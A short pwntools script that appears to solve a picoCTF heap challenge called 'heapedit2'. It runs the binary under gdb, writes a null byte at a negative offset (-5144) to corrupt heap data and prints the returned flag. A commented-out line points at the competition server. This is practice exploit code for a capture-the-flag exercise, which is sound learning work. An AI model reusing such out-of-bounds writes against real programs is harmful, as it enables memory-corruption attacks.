from pwn import *

elf = context.binary = ELF("./heapedit2")  #heapedit2 has changed paths for libs

p = gdb.debug(elf.path, '''
b *main+572
c
''')
# p = process(elf.path)
# p = remote('mercury.picoctf.net', 17612)

print(p.recvuntil("Address: "))
p.sendline("-5144")
print(p.recvuntil("Value: "))
p.sendline(b'\x00')

flag = p.recvline()
print(flag)

# p.interactive()

